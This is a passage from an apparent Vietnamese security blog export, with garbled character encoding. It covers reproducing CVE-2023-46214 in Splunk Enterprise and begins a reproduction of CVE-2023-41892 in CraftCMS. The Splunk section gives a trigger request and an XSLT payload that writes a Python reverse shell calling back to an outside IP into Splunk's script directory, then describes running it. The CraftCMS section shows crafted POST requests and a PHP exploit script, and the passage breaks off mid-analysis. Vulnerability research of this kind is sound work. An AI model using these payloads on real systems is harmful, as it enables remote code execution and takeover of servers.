mÃ£n vÃ¬ file náº±m á»Ÿ Ä‘Æ°á»ng dáº«n: /opt/splunk/var/run/splunk/dispatch/1700794908.13/create-file.xsl\nOkie, tiáº¿p tá»¥c trace ngÆ°á»£c thÃ´i\nTiáº¿p tá»¥c Ä‘á»ƒ Ä‘i vÃ o Ä‘oáº¡n code bá»‹ lá»—i thÃ¬ Ä‘iá»u kiá»‡n if táº¡i dÃ²ng 454 pháº£i tráº£ vá» true, tá»©c lÃ  pháº£i thá»a mÃ£n cÃ¡c kiá»u kiá»‡n sau:\nmodulename khÃ¡c rá»—ng ouput khÃ¡c rá»—ng cÃ³ tham sá»‘ xml trong request tÃ­nh nÄƒng enableSearchJobXslt Ä‘Æ°á»£c báº­t Trong cÃ¡c Ä‘iá»u kiá»‡n trÃªn thÃ¬ tÃ­nh nÄƒng enableSearchJobXslt Ä‘Æ°á»£c báº­t trong /opt/splunk/etc/system/default/web.conf\nPháº§n cÃ²n láº¡i lÃ  cáº§n má»™t param xsl trong request vÃ  biáº¿n moduleName cÃ¹ng biáº¿n output pháº£i khÃ¡c rá»—ng.\nXÃ¡c Ä‘á»‹nh module name HÃ£y xem xÃ©t Ä‘oáº¡n code sau Ä‘Ã¢y\nChÃºng ta tháº¥y self.moduleRoster lÃ  má»™t danh sÃ¡ch chá»©a cÃ¡c module name cÃ³ giÃ¡ trá»‹ tá»« getInstalledModules().\nVÃ o hÃ m getInstalledModules chÃºng ta sáº½ tháº¥y danh sÃ¡ch cÃ¡c module Ä‘Æ°á»£c load tá»« Ä‘á»‹a chá»‰ share/splunk/search_mrsparkle/modules\nNhÆ° váº­y, Ä‘á»ƒ cÃ³ module name, báº¡n chá»‰ cáº§n vÃ o Ä‘á»‹a chá»‰ trÃªn vÃ  láº¥y 1 module name há»£p lá»‡ báº¥t kÃ¬\nXÃ¡c Ä‘á»‹nh giÃ¡ trá»‹ tham sá»‘ xsl Dá»… tháº¥y xsl lÃ  Ä‘á»‹a chá»‰ file xsl Ä‘Ã£ Ä‘Æ°á»£c upload lÃªn\nXÃ¡c Ä‘á»‹nh giÃ¡ trá»‹ cá»§a tham sá»‘ output GiÃ¡ trá»‹ output thÃ¬ sáº½ phá»¥ thuá»™c vÃ o giÃ¡ trá»‹ :asset á»Ÿ endpoint.\nMuá»‘n hiá»ƒu rÃµ thÃ¬ chá»‰ cáº§n vÃ o Ä‘á»c hÃ m cá»¥ thá»ƒ thÃ´i (TÃ´i sáº½ khÃ´ng Ä‘i chi tiáº¿t á»Ÿ bÆ°á»›c nÃ y) Má»™t gá»£i Ã½ nhá» á»Ÿ Ä‘Ã¢y nhÃ©\nKáº¿t há»£p táº¥t cáº£ láº¡i, tÃ´i cÃ³ request trigger nhÆ° sau\n1 2 3 4 5 6 7 8 9 10 11 GET /en-US/api/search/jobs/1700807110.5/results?xsl=/opt/splunk/var/run/splunk/dispatch/1700807110.5/create-file.xsl HTTP/1.1 Host: 192.168.211.142:8000 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0 X-Splunk-Module: Splunk.Module.Message Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: http://192.168.211.142:8000/api/search/jobs/1700794908.13/result?xml=/opt/splunk/var/run/splunk/dispatch/1700794908.13/create-file.xsl\u0026amp;moduleName=xxx Connection: close Cookie: splunkweb_csrf_token_8000=15864032431698820033; token_key=15864032431698820033; experience_id=60628533-bacb-80d8-031c-394ae7d02d4d; session_id_8000=695d1121b3eafb28941fbee55bb0ffa199361729; splunkd_8000=8YZgg26WnjVeb_vE9B5ivk2ey1_LCEOtL^6ROXioKJbLF8eCGGod_z2TW^E0M0kpdZ0YiRFWgQ4gVvg667RisM2uusYst1OrT2HoLj^uOxeICOPBR4ModuolspV7GAn_y^x Upgrade-Insecure-Requests: 1 Request cÃ³ output lÃ  loadingâ€¦\nNhÆ° váº­y trigger thÃ nh cÃ´ng, kiá»ƒm tra xem thÃ nh quáº£ nÃ o\nYeah, trÃªn server cá»§a chÃºng ta Ä‘Ã£ cÃ³ file. NhÆ°ng táº¡i sao nÃ³ láº¡i náº±m á»Ÿ root nhá»‰?\nSau khi thá»­ láº¡i trÃªn local, tÃ´i nháº­n tháº¥y vá»›i payload táº¡o file\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;xsl:stylesheet xmlns:xsl=\u0026#34;http://www.w3.org/1999/XSL/Transform\u0026#34; xmlns:exsl=\u0026#34;http://exslt.org/common\u0026#34; extension-element-prefixes=\u0026#34;exsl\u0026#34; exclude-result-prefixes=\u0026#34;exsl\u0026#34; version=\u0026#34;1.0\u0026#34;\u0026gt; \u0026lt;xsl:template match=\u0026#34;/\u0026#34;\u0026gt; \u0026lt;exsl:document href=\u0026#34;/home/edisc/local_edisc_file.txt\u0026#34;\u0026gt; \u0026lt;xsl:text\u0026gt;Write Write Files\u0026lt;/xsl:text\u0026gt; \u0026lt;/exsl:document\u0026gt; \u0026lt;/xsl:template\u0026gt; \u0026lt;/xsl:stylesheet\u0026gt; tÃ´i cÃ³ thá»ƒ trá» Ä‘á»‹a chá»‰ viáº¿t file táº¡i href Ä‘áº¿n báº¥t cá»© Ä‘Ã¢u. VÃ  vÃ¬ splunk trÃªn local Ä‘ang Ä‘Æ°á»£c deploy vá»›i quyá»n root nÃªn háº§u nhÆ° tÃ´i cÃ³ thá»ƒ viáº¿t file Ä‘áº¿n báº¥t kÃ¬ vá»‹ trÃ­ nÃ o trÃªn server.\nTiáº¿p theo, chÃºng ta cáº§n pháº£i tÃ¬m xem nÃªn viáº¿t á»Ÿ Ä‘Ã¢u Ä‘á»ƒ cÃ³ thá»ƒ trigger Ä‘Æ°á»£c RCE\n4.3 RCE ChÃºng ta Ä‘Ã£ cÃ³ thá»ƒ ghi má»™t file báº¥t kÃ¬ vÃ o vá»‹ trÃ­ báº¥t kÃ¬, bÆ°á»›c tiáº¿p theo lÃ  cáº§n pháº£i tÃ¬m cÃ¡ch Ä‘á»ƒ thá»±c thi code trÃªn server.\nHÃ£y báº¯t Ä‘áº§u vá»›i má»™t vÃ i keyword trÃªn google nÃ o: splunk + execute code; splunk + run code\n4.3.1 RCE vá»›i scripts Dá»… dÃ ng chÃºng ta sáº½ tÃ¬m Ä‘áº¿n Ä‘Æ°á»£c keyword: scripts. CÆ¡ báº£n lÃ  scripts lÃ  má»™t cÃ¢u lá»‡nh cho phÃ©p ngÆ°á»i dÃ¹ng thá»±c thi cÃ¡c Ä‘oáº¡n code python Ä‘Ã£ Ä‘Æ°á»£c Ä‘á»‹nh nghÄ©a trÆ°á»›c trÃªn server Ä‘á»ƒ tá»‘i Æ°u quÃ¡ trÃ¬nh thá»±c thi. Chi tiáº¿t báº¡n cÃ³ thá»ƒ xem á»Ÿ Ä‘Ã¢y\nÄá»ƒ nhanh chÃ³ng, báº¡n cÃ³ thá»ƒ xem video nÃ y\nÄÆ¡n giáº£n lÃ  chÃºng ta chá»‰ cáº§n viáº¿t má»™t file python vÃ o Ä‘Æ°á»ng dáº«n $SPLUNK_HOME\\bin\\scripts hoáº·c $SPLUNK_HOME\\etc\\apps\\search\\bin rá»“i load script cá»§a chÃºng ta lÃªn, tháº¿ lÃ  cháº¡y.\nCá»¥ thá»ƒ, tÃ´i cháº¡y táº¡o file .xsl vá»›i ná»™i dung sau:\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;xsl:stylesheet xmlns:xsl=\u0026#34;http://www.w3.org/1999/XSL/Transform\u0026#34; xmlns:exsl=\u0026#34;http://exslt.org/common\u0026#34; extension-element-prefixes=\u0026#34;exsl\u0026#34;\u0026gt; \u0026lt;xsl:template match=\u0026#34;/\u0026#34;\u0026gt; \u0026lt;exsl:document href=\u0026#34;/opt/splunk/etc/apps/search/bin/getshell_edisc.py\u0026#34; omit-xml-declaration=\u0026#34;yes\u0026#34;\u0026gt; \u0026lt;xsl:text\u0026gt;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;192.168.18.1\u0026#34;,8822));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\u0026#34;sh\u0026#34;)\u0026lt;/xsl:text\u0026gt; \u0026lt;/exsl:document\u0026gt; \u0026lt;/xsl:template\u0026gt; \u0026lt;/xsl:stylesheet\u0026gt; Khi thá»±c hiá»‡n láº¡i á»Ÿ bÆ°á»›c 4.2 thÃ¬ chÃºng ta sáº½ táº¡o Ä‘Æ°á»£c file getshell_edisc.py táº¡i /opt/splunk/etc/apps/search/bin/getshell_edisc.py BÆ°á»›c tiáº¿p theo thÃ¬ chá»‰ cáº§n lÃ m nhÆ° video, load script cá»§a chÃºng ta lÃªn thÃ´i. Video POC nÃ¨\n4.3.2 RCE vá»›i runshellscript Khi Ä‘á»c tÃ i liá»‡u cá»§a scripts trÃªn splunk, tÃ´i chÃº Ã½ Ä‘áº¿n má»™t chÃº Ã½ vá» security VÃ o Ä‘Æ°á»ng dáº«n SPL safeguards for risky commands, chÃºng ta sáº½ tháº¥y má»™t list cÃ¡c command Ä‘Æ°á»£c Ä‘Ã¡nh giÃ¡ lÃ  rá»§i ro náº¿u sá»­ dá»¥ng khÃ´ng Ä‘Ãºng Trong danh sÃ¡ch nÃ y cÃ³ hÃ m runshellscript. HÃ m nÃ y cho phÃ©p ngÆ°á»i dÃ¹ng thá»±c thi script Ä‘á»ƒ alert. Vá»›i command nÃ y, thao tÃ¡c trigger script sáº½ Ä‘Æ¡n giáº£n hÆ¡n á»Ÿ cÃ¡ch trÆ°á»›c:\nViáº¿t shell táº¡i Ä‘Æ°á»ng dáº«n /opt/splunk/bin/scripts/ Nháº­p Ä‘Ãºng format cÃ¢u lá»‡nh vÃ o Ã´ search lÃ  Ä‘á»ƒ trigger V. Nguá»“n tham kháº£o https://www.w3schools.com/xml/xsl_intro.asp\nhttps://www.youtube.com/watch?v=8YYa1CWI1AU\nhttps://prezi.com/y_fuybfudgnd/offensive-xslt/\nhttps://www.blackhat.com/docs/us-15/materials/us-15-Arnaboldi-Abusing-XSLT-For-Practical-Attacks-wp.pdf\nhttps://owasp.org/www-pdf-archive/OWASP_Switzerland_Meeting_2015-06-17_XSLT_SSRF_ENG.pdf\n","description":"CVE-2023-46214 lÃ  mÃ£ lá»—i xuáº¥t hiá»‡n trÃªn sáº£n pháº©m Splunk Enterprise cho phÃ©p attacker cÃ³ thá»ƒ thá»±c thi lá»—i á»Ÿ server (RCE). PhiÃªn báº£n bá»‹ lá»—i tá»« `9.0.7--\u003e9.1.2`. Lá»— há»•ng nÃ y do lá»—i trong cÃ¡ch xá»­ lÃ½ cÃ¡c biáº¿n Ä‘á»•i ngÃ´n ngá»¯ kiá»ƒu dÃ¡ng má»Ÿ rá»™ng (XSLT) cá»§a Splunk Enterprise. Káº» táº¥n cÃ´ng cÃ³ thá»ƒ khai thÃ¡c lá»— há»•ng Ä‘á»ƒ táº£i lÃªn tá»‡p XSLT Ä‘á»™c háº¡i sáº½ Ä‘Æ°á»£c Splunk Enterprise thá»±c thi. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng kiá»ƒm soÃ¡t há»‡ thá»‘ng bá»‹ áº£nh hÆ°á»Ÿng.","id":0,"section":"posts","tags":["cve, python"],"title":"Reproducing CVE-2023-46214: Splunk RCE","uri":"https://minhlongmt183.github.io/posts/cve_2023_46214_splunk_rce/"},{"content":"I. Lá»i má»Ÿ Ä‘áº§u Sau vÃ i thÃ¡ng Ä‘áº¯m chÃ¬m vÃ o Java Deserialize attack, tÃ´i tÃ­ ná»¯a lÃ  bá»‹ cháº¿t chÃ¬m luÃ´n ğŸ˜Ÿ. Äá»£t nÃ y nhÃ¢n tiá»‡n cÃ³ CVE má»›i vá» CraftCMS vÃ  Ä‘á»c Ä‘Æ°á»£c bÃ i blog vá» nÃ³ trÃªn https://blog.calif.io/p/craftcms-rce, tÃ´i quyáº¿t Ä‘á»‹nh reproduce Ä‘á»ƒ Ã´n láº¡i PHP vÃ  láº¥y láº¡i mood. CraftCMS lÃ  má»™t há»‡ thá»‘ng quáº£n lÃ½ ná»™i dung (CMS) mÃ£ nguá»“n má»Ÿ dá»±a trÃªn PHP. NÃ³ Ä‘Æ°á»£c thiáº¿t káº¿ Ä‘á»ƒ táº¡o cÃ¡c trang web vÃ  á»©ng dá»¥ng web máº¡nh máº½ vÃ  linh hoáº¡t. CVE-2023-41892 lÃ  lá»— há»•ng trÃªn CraftCMS, cho phÃ©p attacker RCE mÃ  khÃ´ng cáº§n authen. Lá»— há»•ng Ä‘Ã£ Ä‘Æ°á»£c fix á»Ÿ version 4.4.15 II. Setup mÃ´i trÆ°á»ng CraftCMS Äá»‘i vá»›i cÃ¡c product viáº¿t báº±ng PHP, má»™t trong nhá»¯ng khÃ³ khÄƒn lá»›n nháº¥t hay gáº·p pháº£i lÃ  setup mÃ´i trÆ°á»ng. Vá»›i Craftcms, ta thá»±c hiá»‡n cÃ¡c bÆ°á»›c nhÆ° sau: TÃ´i cÃ i Ä‘áº·t trÃªn mÃ´i trÆ°á»ng ubuntu 22.04, vÃ  cÃ¡i Ä‘áº·t XAMPP vá»›i phiÃªn báº£n php 8.1.17\nSau Ä‘Ã³ cÃ i composer: https://getcomposer.org/Composer-Setup.exe (lÆ°u Ã½ cáº§n cÃ i Ä‘áº·t xampp trÆ°á»›c)\nDownload phiÃªn báº£n craftcms bá»‹ lá»—i, á»Ÿ Ä‘Ã¢y, tÃ´i chá»n báº£n 4.4.12 (https://github.com/craftcms/cms/releases/tag/4.4.12)\nExtract file vÃ  bá» vÃ o folder /opt/lampp/htdocs/my-craftcms\nCháº¡y lá»‡nh composer install Náº¿u bá»‹ lá»—i vá» thiáº¿u extension thÃ¬ vÃ o php.ini cá»§a xampp Ä‘á»ƒ báº­t lÃªn (cÃ³ thá»ƒ xÃ³a Ä‘i file composer.lock)\nCháº¡y lá»‡nh sau Ä‘á»ƒ táº¡o secret key\n1 php craft setup/security-key Äá»ƒ Ä‘áº£m báº£o cÃ¢u lá»‡nh cháº¡y xong, báº¡n cÃ³ thá»ƒ xem trong file .env\nVÃ o Ä‘á»‹a chá»‰ http://localhost/my-craftcms/web/admin/install Táº¡i Ä‘Ã¢y, tiáº¿n hÃ nh cÃ i Ä‘áº·t nhÆ° cÃ¡c hÆ°á»›ng dáº«n khÃ¡c trÃªn internet\nNOTE\nTrÃªn Linux, náº¿u vÃ o Ä‘á»‹a chá»‰ trÃªn bá»‹ lá»—i, cÃ³ thá»ƒ dÃ¹ng cÃ¢u lá»‡nh Ä‘á»ƒ fix\n1 sudo chmod -R 777 .env composer.* config storage vendor web/cpresources Táº¡i bÆ°á»›c nÃ y thÃ¬ trÃªn internet cÃ³ ráº¥t nhiá»u, báº¡n chá»‰ cáº§n chá»n 1 cÃ¡i vÃ  lÃ m theo lÃ  Ä‘Æ°á»£c\nNhÆ° tháº¿ nÃ y lÃ  thÃ nh cÃ´ng rá»“i\nNgoÃ i ra, cÃ¡c báº¡n cÃ³ thá»ƒ tÃ¬m hiá»ƒu vÃ  setup cÃ¡ch Ä‘á»ƒ debug php code theo link sau: https://www.cloudways.com/blog/php-debug/ (thÃªm vÃ o php.ini)\nTrÃªn Windows\n1 2 3 4 [XDebug] zend_extension = \u0026#34;c:\\xampp\\php\\ext\\php_xdebug.dll\u0026#34; xdebug.mode = debug xdebug.start_with_request = yes TrÃªn Linux (/opt/lampp/etc/php.ini)\n1 2 3 zend_extension = xdebug xdebug.mode = debug xdebug.start_with_request = yes III. Lá»— há»•ng CVE-2023-41892 NhÆ° Ä‘Ã£ Ä‘á» cáº­p trÆ°á»›c Ä‘Ã³, Ä‘Ã¢y lÃ  loáº¡i bug cÃ³ liÃªn quan Ä‘áº¿n PHP object injection, cho phÃ©p thá»±c thi code (RCE) (https://github.com/craftcms/cms/security/advisories/GHSA-4w8r-3xrw-v25g) 3.1 Diff-patch tÃ¬m root-cause TrÆ°á»›c tiÃªn, hÃ£y diff-patch thá»­, trÃªn github cÅ©ng cÃ³ (https://github.com/craftcms/cms/commit/c0a37e15cc925c473e60e27fe64054993b867ac1##diff-47dd43d86f85161944dfcce2e41d31955c4184672d9bd9d82b948c6b01b86476)\nDá»… tháº¥y, trong class src/controllers/ConditionsController.php cá»§a craftcms/cms, cÃ¡c Ä‘oáº¡n code Ä‘Æ°á»£c thÃªm vÃ´\n1 2 3 4 5 if (!parent::beforeAction($action)) { return false; } $this-\u0026gt;requireCpRequest(); vÃ  hÃ m return parent::beforeAction($action); táº¡i dÃ²ng 51 bá»‹ bá» Ä‘i. Äiá»u nÃ y cho tháº¥y lá»— há»•ng nÃ y cÃ³ liÃªn quan tá»›i thá»© tá»± thá»±c thi cá»§a cÃ¢u lá»‡nh parent::beforeAction($action);.\nVá»›i 1 newbie nhÆ° tÃ´i thÃ¬ cÃ¢u há»i hiá»‡n lÃªn Ä‘áº§u tiÃªn: Controller:beforeAction lÃ  gÃ¬? CÆ¡ cháº¿ hoáº¡t Ä‘á»™ng nhÆ° tháº¿ nÃ o? (TÃ´i lÃ  1 newbie nÃªn nhá»¯ng cÃ¢u há»i bá»‹ xem ngá»› ngáº©n vÃ  cÆ¡ báº£n lÃ  chuyá»‡n bÃ¬nh thÆ°á»ng, Ä‘iá»u chÃºng ta chá»‰ cáº§n lÃ m Ä‘Ã³ lÃ  ghi nháº­n vÃ  giáº£i Ä‘Ã¡p)\nGoogle má»™t tÃ­, ta sáº½ tÃ¬m Ä‘Æ°á»£c cÃ¢u tráº£ lá»i táº¡i https://hotexamples.com/examples/-/Controller/beforeAction/php-controller-beforeaction-method-examples.html\nÄÃ¢y lÃ  má»™t pre-action hook (tÃ´i khÃ´ng biáº¿t dá»‹ch tháº¿ nÃ o, Ä‘áº¡i khÃ¡i trÆ°á»›c khi PHP controller thá»±c thi, hÃ m nÃ y sáº½ Ä‘Æ°á»£c thá»±c thi trÆ°á»›c). ThÃ´ng thÆ°á»ng, hÃ m nÃ y dÃ¹ng Ä‘á»ƒ check authen hoáº·c má»™t sá»‘ tiá»n Ä‘iá»u kiá»‡n nÃ o Ä‘Ã³ trÆ°á»›c khi thá»±c thi hÃ m controller. ÄÃ¢y lÃ  má»™t action tá»± Ä‘á»™ng cá»§a framework. Äá»“ng thá»i, tá»« blog ta cÅ©ng sáº½ biáº¿t thÃªm 1 framework mÃ  craft sá»­ dá»¥ng: [Yii](https://viblo.asia/p/yii-framework-tim-hieu-cau-truc-va-chay-thu-voi-basic-application-Qbq5QJOJKD8)\nNhÆ° Ä‘Ã£ trÃ¬nh bÃ y á»Ÿ trÃªn, hÃ m beforeAction() thÆ°á»ng liÃªn quan tá»›i authen hoáº·c cÃ¡c tiá»n Ä‘iá»u kiá»‡n nÃ o Ä‘Ã³, káº¿t há»£p vá»›i tiÃªu Ä‘á» cá»§a lá»— há»•ng, ta cÃ³ thá»ƒ Ä‘oÃ¡n ra chÃ­nh thá»© tá»± nÃ y dáº«n tá»›i unauthenticated bug. (khÃ´ng cáº§n xÃ¡c thá»±c.)\nOkie, Ä‘Ã£ tháº¥y Ä‘Æ°á»£c nÆ¡i Ä‘á»ƒ báº¯t Ä‘áº§u rá»“i ta cÃ¹ng tÃ¬m hiá»ƒu flow cá»§a Ä‘oáº¡n code nÃ y Ä‘á»ƒ tÃ¬m sink vÃ  tá»« sink trace ngÆ°á»£c láº¡i source.\n3.2 Tá»« source Ä‘áº¿n sink HÃ£y nhÃ¬n vÃ o pháº§n comment cá»§a class ConditionsController.php\nTheo mÃ´ táº£, class nÃ y xá»­ lÃ½ cÃ¡c tÃ¡c vá»¥ liÃªn quan tá»›i cÃ¡c Ä‘iá»u kiá»‡n Ä‘á»ƒ render, thÃªm xÃ³a cÃ¡c rules. Sau vÃ i tiáº¿ng debug vÃ  xem xÃ©t, cuá»‘i cÃ¹ng tÃ´i cÅ©ng tÃ¬m Ä‘Æ°á»£c endpoint Ä‘á»ƒ touch tá»›i Ä‘Æ°á»£c sink nÃ y:\n1 2 3 4 5 6 7 8 9 10 11 12 13 POST /my-craftcms/web/admin/conditions HTTP/1.1 Host: 192.168.159.148 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: http://192.168.159.148/my-craftcms/web/admin/plugin-store/feed-me Content-Type: application/x-www-form-urlencoded Content-Length: 26 Origin: http://192.168.159.148 DNT: 1 action=conditions%2Frender Tiáº¿p theo, chÃºng ta debug, tÃ¬m hiá»ƒu Ä‘á»ƒ Ä‘iá»n cÃ¡c thÃ´ng tin mÃ¬nh muá»‘n vÃ  xem flow Ä‘i tiáº¿p theo nhÆ° tháº¿ nÃ o, cuá»‘i cÃ¹ng tÃ´i Ä‘Æ°á»£c request nhÆ° sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 POST /my-craftcms/web/admin HTTP/1.1 Host: 192.168.159.149 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: http://192.168.159.148/my-craftcms/web/admin/plugin-store/feed-me Origin: http://192.168.159.148 DNT: 1 Content-Length: 83 Content-Type: application/x-www-form-urlencoded action=conditions%2Frender\u0026amp;config={\u0026#34;name\u0026#34;%3a\u0026#34;condition\u0026#34;}\u0026amp;condition=ConditionInterface Vá»›i request nÃ y, chÆ°Æ¡ng trÃ¬nh sáº½ Ä‘i vÃ o hÃ m vendor\\craftcms\\cms\\src\\services\\Conditions.php:createCondition()\nCÆ¡ báº£n thÃ¬ chÆ°Æ¡ng trÃ¬nh sáº½ láº¥y giÃ¡ trá»‹ name param config, xem nÃ³ lÃ  1 param trong request (á»Ÿ Ä‘Ã¢y lÃ  condition) vÃ  láº¥y giÃ¡ trá»‹ cá»§a condition nhÆ° má»™t class Ä‘á»ƒ táº¡o object. Tuy nhiÃªn, táº¡i dÃ²ng 50, class nÃ y báº¯t buá»™c pháº£i implement interface ConditionInterface)\nÄá»ƒ giáº£i quyáº¿t váº¥n Ä‘á» nay, Ä‘áº§y tiÃªn tÃ´i dÃ¹ng regex Ä‘á»ƒ search trÃªn toÃ n bá»™ source code xem thá»­:\nChá»‰ cÃ³ 1 abstract class BaseCondition. TÃ´i tiáº¿n hÃ nh search trÃªn google Ä‘á»ƒ tÃ¬m document xem sao vÃ  Ä‘Ã£ tÃ¬m Ä‘Æ°á»£c káº¿t quáº£ táº¡i https://docs.craftcms.com/api/v4/craft-base-conditions-conditioninterface.html##public-method. ÄÃ¢y lÃ  danh sÃ¡ch cÃ¡c class chÃºng ta cÃ³ thá»ƒ sá»­ dá»¥ng\nTá»›i request nhÆ° sau, chÃºng ta cÃ³ thá»ƒ tiáº¿p tá»¥c chÆ°Æ¡ng trÃ¬nh\n1 2 3 4 5 6 7 8 9 10 11 12 13 POST /my-craftcms/web/admin HTTP/1.1 Host: 192.168.159.149 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: http://192.168.159.148/my-craftcms/web/admin/plugin-store/feed-me Origin: http://192.168.159.148 DNT: 1 Content-Length: 85 Content-Type: application/x-www-form-urlencoded action=conditions%2Frender\u0026amp;config={\u0026#34;name\u0026#34;%3a\u0026#34;condition\u0026#34;}\u0026amp;condition=craft\\elements\\conditions\\ElementCondition Sau khi kiá»ƒm tra class truyá»n vÃ o Ä‘Æ°á»£c implement ConditionInterface, hÃ m sáº½ tráº£ vá» má»™t object Ä‘Æ°á»£c táº¡o thÃ nh tá»« class truyá»n vÃ o\nDá»… tháº¥y, hÃ m createObject() cÃ²n cÃ³ thÃªm hai trÆ°á»ng attributes vÃ  conditionRules Ä‘Æ°á»£c láº¥y giÃ¡ trá»‹ tá»« config vÃ  rules.\nCÃ¹ng tiáº¿p tá»¥c flow cá»§a chÆ°Æ¡ng trÃ¬nh:\nSau khi tráº£ class vá», hÃ m Craft:configure Ä‘Æ°á»£c thá»±c thi:\nHÃ m Craft:configure nháº­n vÃ o hai tham sá»‘ $object vÃ  $properties tÆ°Æ¡ng á»©ng vá»›i $this-\u0026gt;_condition vÃ  $baseConfig (hai giÃ¡ trá»‹ nÃ y chÃºng ta control Ä‘Æ°á»£c). Nhiá»‡m vá»¥ cá»§a hÃ m lÃ  gÃ¡n cÃ¡c properties cho object.\nNhÃ¬n sÆ¡ qua thÃ¬ ráº¥t bÃ¬nh thÆ°á»ng Ä‘Ãºng khÃ´ng? LÃºc Ä‘áº§u tÃ´i nghÄ© lá»— há»•ng lÃ  á»Ÿ Ä‘Ã¢y vÃ¬ chÃºng ta cÃ³ thá»ƒ gÃ¡n báº¥t kÃ¬ giÃ¡ trá»‹ nÃ o cho báº¥t kÃ¬ properties nÃ o cá»§a $object. NhÆ° tháº¿, viá»‡c cÃ²n láº¡i tÃ¬m gadget chain Ä‘á»ƒ khai thÃ¡c thÃ´i. Tuy nhiÃªn, ta tháº¥y $object á»Ÿ Ä‘Ã¢y cÃ³ giá»›i háº¡n: Ä‘Æ°á»£c táº¡o thÃ nh tá»« cÃ¡c class implement ConditionInterface.\nTÃ´i nhá»› ráº±ng trong blog cá»§a anh thanhtc cÃ³ nÃ³i lá»— há»•ng nÃ y cho phÃ©p táº¡o má»™t object báº¥t kÃ¬ nhÆ° tá»›i Ä‘Ã¢y tÃ´i chá»‰ cÃ³ thá»ƒ táº¡o object mÃ´t cÃ¡ch giá»›i háº¡n. Sau Ä‘Ã³, tÃ´i quyáº¿t Ä‘á»‹nh Ä‘á»c kÄ© láº¡i blog má»™t láº§n ná»¯a (cháº¯c Ä‘Ã¢y lÃ  láº§n Ä‘á»c láº¡i thá»© 5-6) vÃ  tÃ´i Ä‘Ã£ chÃº Ã½ tá»›i cÃ¡i hint mÃ  anh Ä‘á»ƒ láº¡i:\nBáº¡n tháº¥y chá»©? Trong luá»“ng thá»±c thi trÃªn, chÃºng ta Ä‘ang á»Ÿ \\yii\\BaseYii::configure\nÄáº·t breakpoint táº¡i \\yii\\base\\Componet::__set, chÃºng ta sáº½ tháº¥y, táº¡i dÃ²ng 558, phÃ©p gÃ¡n $object-\u0026gt;$name = $value sáº½ gá»i tá»›i method \\yii\\base\\Componet::__set.\nHÃ£y cÃ¹ng sá»­a Ä‘á»•i láº¡i request cá»§a chÃºng ta má»™t tÃ­. TÃ´i viáº¿t mÃ£ exploit báº±ng PHP Ä‘á»ƒ tiá»‡n cho viá»‡c build payload (hÆ¡n dÃ¹ng burpsuite)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 \u0026lt;?php function triggerCode($url, $postData, $proxy = \u0026#39;127.0.0.1:8080\u0026#39;) { // Initialize cURL session $ch = curl_init($url); $options = [ CURLOPT_POST =\u0026gt; true, CURLOPT_POSTFIELDS =\u0026gt; http_build_query($postData), // Encode the POST data CURLOPT_RETURNTRANSFER =\u0026gt; true, CURLOPT_PROXY =\u0026gt; $proxy, // Specify the proxy address and port ]; curl_setopt_array($ch, $options); // Execute the cURL session and store the response $response = curl_exec($ch); // Check for cURL errors if (curl_errno($ch)) { echo \u0026#39;cURL error: \u0026#39; . curl_error($ch); } else { // Output the response from the server echo \u0026#39;Response: \u0026#39; . $response; } // Close the cURL session curl_close($ch); } // Usage for triggerCode $url = \u0026#39;http://192.168.159.149/my-craftcms/web/admin\u0026#39;; $postData = [ \u0026#39;action\u0026#39; =\u0026gt; \u0026#39;conditions/render\u0026#39;, \u0026#39;config\u0026#39; =\u0026gt; json_encode([ \u0026#34;name\u0026#34; =\u0026gt; \u0026#34;conditionClass\u0026#34;, \u0026#34;conditionClass\u0026#34; =\u0026gt; \u0026#34;xxxxx\u0026#34; ]), \u0026#39;conditionClass\u0026#39; =\u0026gt; [ \u0026#39;class\u0026#39; =\u0026gt; \u0026#39;craft\\elements\\conditions\\ElementCondition\u0026#39; ] ]; triggerCode($url, $postData); ?\u0026gt; Vá»›i request trÃªn chÃºng ta sáº½ vÃ o Ä‘Æ°á»£c hÃ m \\yii\\base\\Componet::__set\nHai tham sá»‘ truyá»n vÃ o lÃ  $name vÃ  $value. Tuy theo giÃ¡ trá»‹ $name truyá»n vÃ o lÃ  gÃ¬ thÃ¬ chÆ°Æ¡ng trÃ¬nh sáº½ xá»­ lÃ½ khÃ¡c nhau.\nHÃ£y nhÃ¬n vÃ o dÃ²ng lá»‡nh 191. Náº¿u $name báº¯t Ä‘áº§u báº±ng 'as ' thÃ¬ dÃ²ng 191 sáº½ thá»±c thi vÃ  cÃ¢u lá»‡nh Yii:createObject($value) sáº½ Ä‘Æ°á»£c gá»i. NgoÃ i ra, nhÃ¬n vÃ o giÃ¡ trá»‹ debug, 